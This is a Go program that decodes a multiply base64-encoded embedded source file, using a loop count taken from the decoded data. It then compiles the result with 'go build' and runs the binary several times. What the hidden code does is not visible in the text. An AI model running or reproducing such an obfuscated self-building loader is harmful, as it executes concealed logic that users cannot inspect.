package main

import (
	"bytes"
	"encoding/base64"
	"errors"
	"io/fs"
	"log"
	"os"
	"os/exec"
)

const (
	binFile    = "nathan_calculate"
	binPath    = "./" + binFile
	srcFile    = binFile + ".go"
	srcFileTmp = binFile + ".go.tmp"
	srcEnc     = "V1RCa1IyRnRSWGxTYlRWaFZUQktNRmRXWkhOa1ZVNXVZMGhDYVZkRlNqSlpNalZTV2pCc2RGZHVVbXRSTUd4TVVUSXhZVTFYU25SVVYyUnBWakJhZDFsdGJHNWpSV3hKWXpCMFJGWXhjREJhUlUweFZWZE9kR0pJVm10U00yZ3hVekJPUzFReVJsaFViWGhLVTBaS05WcFdUak5hTVZaSVZtcENZVmRGYkRGVFYyeHlVekphVW1KNk1Fc0s="
)

func main() {
	if runBin(true) {
		return
	}
	compileBin()
	const warmRuns = 5
	for i := 0; i < warmRuns; i++ {
		if !runBin(i == warmRuns-1) {
			log.Fatal("failed to run binary")
		}
	}
}

func runBin(attach bool) bool {
	cmd := exec.Command(binPath)
	if attach {
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
	}
	if err := cmd.Run(); err != nil {
		if errors.Is(err, fs.ErrNotExist) {
			return false
		}
		log.Fatal(err)
	}
	return true
}

func compileBin() {
	srcDec, err := base64.StdEncoding.DecodeString(srcEnc)
	try(err)
	f, err := os.Create(srcFile)
	try(err)
	defer os.Remove(srcFile)
	_, err = f.Write(srcDec)
	try(err)
	try(f.Close())
	for i := 0; i < bytes.IndexByte(srcDec, 107); i++ {
		execCmd("base64", "-d", "-i", srcFile, "-o", srcFileTmp)
		execCmd("mv", srcFileTmp, srcFile)
	}
	execCmd("go", "build", "-o", binFile, srcFile)
}

func execCmd(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	try(cmd.Run())
}

func try(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
